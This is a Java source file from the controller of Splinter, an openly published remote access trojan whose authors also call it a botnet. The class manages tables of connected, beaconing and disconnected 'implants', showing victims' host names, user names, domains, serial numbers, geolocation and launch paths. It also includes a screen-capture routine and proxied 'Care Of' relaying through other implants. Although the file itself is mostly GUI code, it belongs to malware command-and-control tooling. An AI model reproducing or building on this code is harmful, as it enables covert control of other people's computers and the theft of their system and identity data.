/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Controller.Drivers;

import Controller.GUI.JPanel_BeaconCommand;
import Controller.GUI.JPanel_TextDisplayPane;
import Controller.GUI.JTable_Solomon;
import Controller.GUI.Splinter_GUI;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import Implant.Payloads.Worker_Thread_Payloads;
import java.awt.Color;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.PrintStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Date;
import java.util.Vector;
import javax.imageio.ImageIO;
import javax.swing.DefaultListModel;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JOptionPane;
import javax.swing.filechooser.FileFilter;
import java.awt.*;
import javax.swing.*;

public class Drivers
{
  public static final String strMyClassName = "Drivers";
  public static String fileSeperator = System.getProperty("file.separator");
  public static final String NICK_NAME = "Splinter";
  public static boolean outputEnabled = true;

  public static Image imgFrameIcon = null;

  public static ArrayList<JPanel_BeaconCommand> alBeaconCommands_GUI = new ArrayList();

  public static String strJTableColumn_InsertID = "Insert ID";
  public static final String DISCONNECT_TOKEN = "disconnectImplant";
  public static JLabel jlblNumImplantsConnected = null;
  public static JTable_Solomon jtblConnectedImplants = null;
  public static JTable_Solomon jtblDisconnectedImplants = null;
  public static JTable_Solomon jtblBeaconImplants = null;
  public static JTable_Solomon jtblLoggingAgents = null;
  public static JPanel_TextDisplayPane txtpne_broadcastMessageBoard;
  public static JPanel_TextDisplayPane txtpne_BEACON_broadcastMessageBoard;
  public static JPanel_TextDisplayPane txtpne_mainChatBoard;
  public static volatile DefaultListModel dfltLstMdl_ConnectedImplants;
  public static volatile DefaultListModel dfltLstMdl_BeaconingImplants;
  public static JList jlstConnectedImplants;
  public static JList jlstBeaconImplants;
  public static DefaultListModel dfltLstMdl_ConnectedControllers;
  public static JList jlstConnectedControllers;
  public static ArrayList<Thread_Terminal> alTerminals = null;

  public static JPanel_TextDisplayPane jtxtpne_CnslOut = null;
  public static final double VERSION = 1.41D;
  public static final int MAX_THREAD_COUNT = 900000;
  public static volatile boolean acquireAgentOverheadData = true;

  public static volatile Color clrBackground = Color.white;
  public static volatile Color clrForeground = Color.black;
  public static volatile Color clrController = Color.white;
  public static volatile Color clrImplant = Color.white;

  public static int fontSize = 12;

  public static String strImportantMessage_Header = "!";
  public static String strThreadID_Header = "Thread ID";
  public static String strGeoLocation_Header = "Geo Location";
  public static String strLastConnectionTime_Header = "Connection Time";
  public static String strImplantID_Header = "Implant ID";
  public static String strBeaconInterval_Header = "Beacon Interval";
  public static String strNextBeaconApproxTime_Header = "Approx Time til Next Beacon";
  public static String strDisconnectionTime_Header = "Disconnection Time";
  public static String strImplantType_Header = "Implant Type";
  public static String strCareOfAddress_Header = "Care Of";
  public static String strImplantLaunchPath_Header = "Launch Path";
  public static String strBinaryName_Header = "Binary";
  public static String strSystemIP_Header = "System IP";
  public static String strHostName_Header = "Host Name";
  public static String strOS_Header = "OS";
  public static String strOS_Type_Header = "OS Type";
  public static String strUserName_Header = "User Name";
  public static String strUserDomain_Header = "User Domain";
  public static String strTempPath_Header = "Temp Path";
  public static String strUserProfile_Header = "User Profile";

  public static String strOS_Architecture_Header = "Architecture";
  public static String strOS_ServicePack_Header = "Service Pack";
  public static String strNumUsers_Header = "# Users";
  public static String strSerialNumber_Header = "Serial Number";
  public static String strProcessor_Header = "Processor";
  public static String strNumberOfProcessors_Header = "# Processors";
  public static String strCountryCode_Header = "Country Code";
  public static String strSystemRoot_Header = "System Root";
  public static String strHomeDrive_Header = "Home Drive";
  public static String strVersionNumber_Header = "Version Number";

  static String strImportntMessage_ToolTip = "Indicates there is an important message on this implant or that it has not finished authenticating with Splinter";
  static String strCareOfAddress_ToolTip = "Indicates the Hive this implant is connected through.  To send cmd to this implant, it actually is proxied through the \"Care Of\" agent (if applicable)";
  static String strGeoLocation_ToolTip = "Geo Location Approximation based on last hop of router before connecting to the controller";
  static String strBinaryName_ToolTip = "If known, this will be the name of binary impant file";

  public static String[] jTableConnectedAgentsColNames = { strImportantMessage_Header, strThreadID_Header, strGeoLocation_Header, strImplantType_Header, strCareOfAddress_Header, strImplantLaunchPath_Header, strBinaryName_Header, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header };
  public static Vector vctJTableConnectedAgentsColNames = new Vector(1, 1);

  public static String[] arrJTableConnectedAgentsToolTips = { strImportntMessage_ToolTip, strThreadID_Header, strGeoLocation_ToolTip, strImplantType_Header, strCareOfAddress_ToolTip, strImplantLaunchPath_Header, strBinaryName_ToolTip, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header };
  public static Vector vctJTableConnectedAgentsToolTips = new Vector(1, 1);

  public static String[] jTableDISCONNECTED_AGENTS_ConnectedAgentsColNames = { strDisconnectionTime_Header, strThreadID_Header, strGeoLocation_Header, strImplantType_Header, strCareOfAddress_Header, strImplantLaunchPath_Header, strBinaryName_Header, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header };
  public static Vector vctJTableDISCONNECTED_AGENTS_ConnectedAgentsColNames = new Vector(1, 1);

  public static String[] arrJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips = { strDisconnectionTime_Header, strThreadID_Header, strGeoLocation_Header, strImplantType_Header, strCareOfAddress_ToolTip, strImplantLaunchPath_Header, strBinaryName_ToolTip, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header };
  public static Vector vctJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips = new Vector(1, 1);

  public static String[] arrJTableBEACONING_AGENTS_ConnectedAgentsColNames = { strLastConnectionTime_Header, strImplantID_Header, strBeaconInterval_Header, strNextBeaconApproxTime_Header, strThreadID_Header, strGeoLocation_Header, strImplantType_Header, strCareOfAddress_Header, strImplantLaunchPath_Header, strBinaryName_Header, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header };
  public static Vector vctJTableBEACONING_AGENTS_ConnectedAgentsColNames = new Vector(1, 1);

  public static String[] arrJTableBEACONING_AGENTS_ConnectedAgentsToolTips = { strLastConnectionTime_Header, strImplantID_Header, strBeaconInterval_Header, strNextBeaconApproxTime_Header, strThreadID_Header, strGeoLocation_Header, strImplantType_Header, strCareOfAddress_ToolTip, strImplantLaunchPath_Header, strBinaryName_ToolTip, strSystemIP_Header, strHostName_Header, strOS_Header, strOS_Type_Header, strUserName_Header, strUserDomain_Header, strTempPath_Header, strUserProfile_Header, strOS_Architecture_Header, strNumberOfProcessors_Header, strSystemRoot_Header, strOS_ServicePack_Header, strNumUsers_Header, strSerialNumber_Header, strProcessor_Header, strCountryCode_Header, strHomeDrive_Header, strVersionNumber_Header };
  public static Vector vctJTableBEACONING_AGENTS_ConnectedAgentsToolTips = new Vector(1, 1);

  public static volatile Worker_Thread_Payloads workerthread_ScreenRecord = null;

  public static void printConsoleWelcomeSplash()
  {
    System.out.println("\n*******************************************************************************");
    System.out.println("*    Splinter vers 1.41 - BETA Programmed by Solomon Sonya and Nick Kulesza   *");
    System.out.println("*******************************************************************************\n\n");
  }

  public static boolean appendRelayMessageCommandTerminal(String strToAppend)
  {
    try
    {
      txtpne_broadcastMessageBoard.appendString(true, "ME", strToAppend + "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t", clrController, clrImplant.darker().darker());

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("appendRelayMessageCommandTerminal", "Drivers", e, "", false);
    }

    return false;
  }

  public static boolean appendCommandTerminalStatusMessage(String strToAppend)
  {
    try
    {
      txtpne_broadcastMessageBoard.appendString(true, "ME", "CONTROLLER MESSAGE: " + strToAppend + "\t\t\t\t\t\t\t\t\t\t\t\t\t", clrBackground, clrForeground);

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("appendCommandTerminalStatusMessage", "Drivers", e, "", false);
    }

    return false;
  }

  public static boolean removeThread(Thread_Terminal threadToRemove, long threadID_ToRemove)
  {
    try
    {
      if ((alTerminals == null) || (alTerminals.size() < 1))
      {
        sop("ArrayList is empty. No clients further to remove");
        return false;
      }

      if (threadToRemove == null)
      {
        sop("No agent received to disconnect.");
        return false;
      }
      try {
        threadToRemove.I_am_Disconnected_From_Implant = true;
      } catch (Exception localException1) {
      }
      if (alTerminals.contains(threadToRemove))
      {
        alTerminals.remove(threadToRemove);
        threadToRemove.I_am_Disconnected_From_Implant = true;
      }

      try
      {
        if (threadToRemove.i_am_Beacon_Agent)
        {
          threadToRemove.sktMyConnection.close();
        }
        else
        {
          jtblDisconnectedImplants.addRow(threadToRemove.getJTableRowData());
        }
      }
      catch (Exception localException2)
      {
      }
      try
      {
        if (threadToRemove.i_am_Beacon_Agent)
        {
          jtblBeaconImplants.updateJTable = true;
          updateBeaconImplants();
        }
        else
        {
          updateConnectedImplants();
          jtblConnectedImplants.updateJTable = true;
        }
      }
      catch (Exception localException3)
      {
      }

      return true;
    }
    catch (Exception e)
    {
      sop("Exception handled when removing thread id: " + threadID_ToRemove);
      try
      {
        if (threadToRemove.i_am_Beacon_Agent)
        {
          updateBeaconImplants();
        }
        else
        {
          updateConnectedImplants();
          jtblConnectedImplants.updateJTable = true;
        }
      } catch (Exception localException4) {
      }
    }
    return false;
  }

  public static boolean setJFrameIcon(JDialog frame)
  {
    try
    {
      Image imgFrameIcon = new ImageIcon(Splinter_GUI.class.getResource("/Controller/Images/RAT_Icon.gif")).getImage();
      frame.setIconImage(imgFrameIcon);
    } catch (Exception e) {
      sop("Unable to set JFrame Icon");
    }

    return false;
  }

  public static boolean setJFrameIcon(JFrame frame)
  {
    try
    {
      Image imgFrameIcon = new ImageIcon(Splinter_GUI.class.getResource("/Controller/Images/RAT_Icon.gif")).getImage();
      frame.setIconImage(imgFrameIcon);
    } catch (Exception e) {
      sop("* * Unable to set JFrame Icon");
    }

    return false;
  }

  public static boolean updateBeaconImplants()
  {
    try
    {
      try
      {
        jtblBeaconImplants.removeAllRows();
      }
      catch (Exception localException1)
      {
      }
      try
      {
        jtblBeaconImplants.jbtnRefresh.setEnabled(false);
        jtblBeaconImplants.jbtnDisconnectImplant.setEnabled(false);
        jtblBeaconImplants.jbtnGoogleMap.setEnabled(false);
      }
      catch (Exception localException2)
      {
      }
      if (Driver.alBeaconTerminals.size() > 0)
      {
        try
        {
          jtblBeaconImplants.jbtnRefresh.setEnabled(true);
          jtblBeaconImplants.jbtnDisconnectImplant.setEnabled(true);
          jtblBeaconImplants.jbtnGoogleMap.setEnabled(true);
        }
        catch (Exception localException3) {
        }
      }
      Thread_Terminal thread = null;

      for (int i = 0; i < Driver.alBeaconTerminals.size(); i++)
      {
        try
        {
          thread = (Thread_Terminal)Driver.alBeaconTerminals.get(i);

          jtblBeaconImplants.addRow(thread.getJTableRowData());
        }
        catch (ArrayIndexOutOfBoundsException aiob)
        {
          sop("***No BEACON thread to add!!!");
        }

      }

      return true;
    }
    catch (Exception e)
    {
      eop("updateBeaconImplants", "Drivers", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static boolean updateLoggingAgents()
  {
    try
    {
      try
      {
        jtblLoggingAgents.removeAllRows();
      }
      catch (Exception localException1)
      {
      }
      try
      {
        jtblLoggingAgents.jbtnRefresh.setEnabled(false);
        jtblLoggingAgents.jbtnDisconnectImplant.setEnabled(false);
        jtblLoggingAgents.jbtnGoogleMap.setEnabled(false);
      }
      catch (Exception localException2)
      {
      }
      if (Driver.alLoggingAgents.size() > 0)
      {
        try
        {
          jtblLoggingAgents.jbtnRefresh.setEnabled(true);
          jtblLoggingAgents.jbtnDisconnectImplant.setEnabled(true);
          jtblLoggingAgents.jbtnGoogleMap.setEnabled(true);
        }
        catch (Exception localException3) {
        }
      }
      Thread_Terminal thread = null;

      for (int i = 0; i < Driver.alLoggingAgents.size(); i++)
      {
        try
        {
          thread = (Thread_Terminal)Driver.alLoggingAgents.get(i);

          jtblLoggingAgents.addRow(thread.getJTableRowData());
        }
        catch (ArrayIndexOutOfBoundsException aiob)
        {
          sop("***No LOGGIE thread to add!!!");
        }

      }

      return true;
    }
    catch (Exception e)
    {
      eop("updateLoggingAgents", "Drivers", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static boolean indicateServerSocketStatus_Closed()
  {
    try
    {
      Splinter_GUI.jlblServerSocketStatus.setText("CLOSED");
      Splinter_GUI.jlblEstablishedPort.setText("NOT ESTABLISHED");
      Splinter_GUI.jlblLHOST_ME_IP.setText("SOCKET CLOSED");

      Splinter_GUI.jlblServerSocketStatus.setBackground(Color.RED);
      Splinter_GUI.jlblServerSocketStatus.setForeground(Color.WHITE);

      return true;
    }
    catch (Exception e)
    {
      eop("indicateServerSocketStatus_Closed", "Drivers - Controller", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static boolean updateConnectedImplants()
  {
    try
    {
      jlblNumImplantsConnected.setText(""+alTerminals.size());
      try
      {
        jtblConnectedImplants.removeAllRows();

        dfltLstMdl_ConnectedImplants.removeAllElements();
        dfltLstMdl_ConnectedControllers.removeAllElements();
      }
      catch (Exception localException1)
      {
      }
      try {
        jtblConnectedImplants.jbtnRefresh.setEnabled(false);
        jtblConnectedImplants.jbtnDisconnectImplant.setEnabled(false);
        jtblConnectedImplants.jbtnGoogleMap.setEnabled(false);
      }
      catch (Exception localException2)
      {
      }

      if (alTerminals.size() > 0)
      {
        try
        {
          jtblConnectedImplants.jbtnRefresh.setEnabled(true);
          jtblConnectedImplants.jbtnDisconnectImplant.setEnabled(true);
          jtblConnectedImplants.jbtnGoogleMap.setEnabled(true);
        }
        catch (Exception localException3)
        {
        }

      }

      Thread_Terminal thread = null;

      for (int i = 0; i < alTerminals.size(); i++)
      {
        try
        {
          thread = (Thread_Terminal)alTerminals.get(i);

          jtblConnectedImplants.addRow(thread.getJTableRowData());

          dfltLstMdl_ConnectedImplants.addElement(thread.getJListData());

          dfltLstMdl_ConnectedControllers.addElement(thread.getChatJListData());
        }
        catch (ArrayIndexOutOfBoundsException aiob)
        {
          sop("***No thread to add!!!");
        }

      }

      return true;
    }
    catch (Exception e)
    {
      eop("updateConnectedImplants", "Drivers", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static void sop(String line)
  {
    if (outputEnabled) {
      System.out.println(line);
    }
    if (jtxtpne_CnslOut != null)
      jtxtpne_CnslOut.appendString(false, line, clrForeground, clrBackground);
  }

  public static void sp(String line)
  {
    if (outputEnabled) {
      System.out.print(line);
    }
    if (jtxtpne_CnslOut != null)
      jtxtpne_CnslOut.appendString(false, line, clrForeground, clrBackground);
  }

  public static boolean setColorScheme_Default()
  {
    try
    {
      clrBackground = Color.white;
      clrForeground = Color.black;
      clrController = Color.white;
      clrImplant = Color.white;

      return true;
    }
    catch (Exception e)
    {
      sop("setColorScheme_Default");
    }

    return false;
  }

  public static void eop(String mtdName, String strMyClassName, Exception e, String errorMessage, boolean printStackTrace)
  {
    if ((errorMessage == null) || (errorMessage.trim().equals(""))) {
      sop("\nException caught in " + mtdName + " mtd in " + strMyClassName);
    }
    else {
      sop("\nException caught in " + mtdName + " mtd in " + strMyClassName + " Error Message: " + errorMessage);
    }
    if (printStackTrace)
      e.printStackTrace(System.out);
  }

  public static File captureScreen(String screenImgSavePath, String fileNameWithoutExtension)
  {
    try
    {
      if ((screenImgSavePath == null) || (screenImgSavePath.trim().equals("")))
      {
        screenImgSavePath = "." + Driver.fileSeperator;
      }

      File fleCaptureFile = new File(screenImgSavePath, fileNameWithoutExtension + "." + "png");

      Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
      BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);

      ImageIO.write(imgCapture, "png", fleCaptureFile);

      return fleCaptureFile;
    }
    catch (Exception e)
    {
      Driver.eop("screenImgSavePath", "Drivers - Controller", e, e.getLocalizedMessage(), false);
      try
      {
        screenImgSavePath = "." + Driver.fileSeperator;

        File fleCaptureFile = new File(screenImgSavePath, fileNameWithoutExtension + "." + "png");

        Rectangle rectScreen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage imgCapture = new Robot().createScreenCapture(rectScreen);
        ImageIO.write(imgCapture, "png", new File(screenImgSavePath, fileNameWithoutExtension + "." + "png"));

        return fleCaptureFile;
      }
      catch (Exception ee)
      {
        Driver.sop("Second attempt to save file at current working directory was unsuccessful as well");
      }
    }
    return null;
  }

  public static String getTimeStamp_Without_Date()
  {
    String timeToSplit = "";
    String dateTime_To_Display = "";

    String strHourMin = "";

    Date dateTime = new Date();
    try
    {
      timeToSplit = dateTime.toString();

      String[] arrSplitTime = timeToSplit.split(" ");

      if (arrSplitTime.length != 6) {
        throw new Exception();
      }
      String[] arrSplitHour = arrSplitTime[3].split(":");

      if (arrSplitHour.length != 3) {
        throw new Exception();
      }
      return strHourMin = arrSplitHour[0] + ":" + arrSplitHour[1] + " \"" + arrSplitHour[2];
    }
    catch (Exception e)
    {
      dateTime_To_Display = "Time: " + dateTime.toString();
    }

    return dateTime_To_Display;
  }

  public static int jop_Confirm(String strText, String strTitle)
  {
    try
    {
      return JOptionPane.showConfirmDialog(null, strText, strTitle, 0, 3);
    }
    catch (Exception localException)
    {
    }

    return -1;
  }

  public static int jop_Confirm_YES_NO_CANCEL(String strText, String strTitle)
  {
    try
    {
      return JOptionPane.showConfirmDialog(null, strText, strTitle, 1, 3);
    }
    catch (Exception localException)
    {
    }

    return -1;
  }

  public static File querySelectFile(boolean openDialog, String dialogueTitle, int fileChooserSelectionMode, boolean thisLoadsCSV, boolean useFileFilter)
  {
    try
    {
      JFileChooser jfc = new JFileChooser(new File("."));
      jfc.setFileSelectionMode(fileChooserSelectionMode);
      jfc.setDialogTitle(dialogueTitle);

      if (thisLoadsCSV)
      {
        jfc.setFileFilter(new FileFilter()
        {
          public boolean accept(File fle)
          {
            if (fle.isDirectory()) {
              return true;
            }
            String strFleName = fle.getName().toLowerCase();

            return strFleName.endsWith(".csv");
          }

          public String getDescription()
          {
            return "Comma Separated Values";
          }

        });
      }
      else if (useFileFilter)
      {
        jfc.setFileFilter(new FileFilter()
        {
          public boolean accept(File fle)
          {
            String extension = "";

            if (fle.isDirectory()) {
              return true;
            }
            if (fle == null) {
              return false;
            }
            if ((fle != null) && (fle.exists()) && (Drivers.getFileExtension(fle, false) != null)) {
              extension = Drivers.getFileExtension(fle, false).replace(".", "");
            }

            return false;
          }

          public String getDescription()
          {
            return "Specific Formats";
          }

        });
      }

      try
      {
        jfc.setCurrentDirectory(new File(".\\"));
      } catch (Exception localException1) {
      }
      int selection = 0;

      if (openDialog)
      {
        selection = jfc.showOpenDialog(null);
      }
      else
      {
        selection = jfc.showSaveDialog(null);
      }

      if (selection == 0)
      {
        if ((openDialog) || ((!openDialog) && (!thisLoadsCSV))) {
          return jfc.getSelectedFile();
        }

        return new File(jfc.getSelectedFile().getAbsolutePath() + ".csv");
      }

    }
    catch (Exception e)
    {
      eop("querySelectFile", "Drivers", e, "", false);
    }

    return null;
  }

  public static String getFileExtension(File fle, boolean removeDot_Preceeding_Extension)
  {
    try
    {
      if (fle != null)
      {
        if (removeDot_Preceeding_Extension) {
          return fle.toString().substring(fle.toString().lastIndexOf(".") + 1);
        }

        if ((!fle.toString().contains(".")) || (fle.toString().lastIndexOf(".") < 0))
        {
          try
          {
            return fle.toString().substring(fle.toString().lastIndexOf(System.getProperty("file.separator")));
          }
          catch (Exception e)
          {
            return " ";
          }
        }

        return fle.toString().substring(fle.toString().lastIndexOf("."));
      }

    }
    catch (NullPointerException npe)
    {
      sop("NullPointerException caught in getFileExtension_ByteArray mtd in Drivers.  This seems to be a sporadic error, called when user first attempts to view the files in a directory. This does not affect funtionality of program.  Dismissing error...");
    }
    catch (Exception e)
    {
      eop("getFileExtension", "Drivers", e, "", false);
    }

    return null;
  }

  public static void jop_Error(String strMsg, String strTitle)
  {
    JOptionPane.showMessageDialog(null, strMsg, strTitle, 0);
  }

  public static void jop_Warning(String strMsg, String strTitle)
  {
    JOptionPane.showMessageDialog(null, strMsg, strTitle, 2);
  }

  public static void jop_Message(String strMsg, String strTitle)
  {
    JOptionPane.showMessageDialog(null, strMsg, strTitle, 1);
  }

  public static void jop(String strMsg)
  {
    JOptionPane.showMessageDialog(null, strMsg, "Unable to continue selected action...", 1);
  }

  public static void jop_Message(String strMsg) {
    JOptionPane.showMessageDialog(null, strMsg, "Message", 1);
  }

  public static String jop_Query(String strMsg, String strTitle)
  {
    Object o = strMsg;

    return JOptionPane.showInputDialog(null, o, strTitle, 3);
  }
}